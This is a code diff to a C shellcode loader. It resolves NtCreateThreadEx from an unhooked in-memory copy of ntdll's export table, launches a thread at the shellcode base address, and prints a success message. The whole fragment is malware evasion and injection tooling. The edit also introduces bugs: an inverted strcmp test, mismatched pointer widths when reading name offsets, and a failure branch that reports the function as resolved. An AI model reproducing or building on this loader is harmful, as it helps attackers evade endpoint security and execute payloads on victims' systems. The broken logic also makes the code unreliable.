@@ -189,24 +189,32 @@ void UnhookDLLLoading() {
         }
         printf("\n[+] Changed the permission of memory from RW to RX @ %p\n", pNtProtectVirtualMemory);
     }
+
     DWORD* addrNames3 = addrNames;
     _NtCreateThreadEx pNtCreateThreadEx = NULL;
-    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
-    for (unsigned int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
-        char* name = (char*)((DWORD64)alloc_mem + *(DWORD*)addrNames3++);
 
-        if (strstr(name, NtCreateThreadExtxt) != NULL) {
-            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD64)alloc_mem + addrFunction[addrOrdinal[index]]);
+    char NtCreateThreadExtxt[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x',0 };
+
+    for (int index = 0; index < EXPORT_DIR->NumberOfFunctions; index++) {
+        // Calculate the address of the function name
+        char* name = (char*)((DWORD_PTR)alloc_mem + *(DWORD_PTR*)addrNames3++);
+
+        // Compare the name with the target function
+        if (strcmp(name, NtCreateThreadExtxt) != NULL) {
+            // Resolve the function address
+            pNtCreateThreadEx = (_NtCreateThreadEx)((DWORD_PTR)alloc_mem + addrFunction[addrOrdinal[index]]);
             break;
         }
-
     }
+
     if (pNtCreateThreadEx) {
         NTSTATUS status3 = pNtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, NtCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
         if (!NT_SUCCESS(status3)) {
             return;
         }
         printf("\n[+] Executed Shellcode............!!! @ %p\n", pNtCreateThreadEx);
+    } else {
+        printf("NtCreateThreadEx resolved at: %p\n", pNtCreateThreadEx);
     }
     LARGE_INTEGER Timeout;
     Timeout.QuadPart = -10000000;
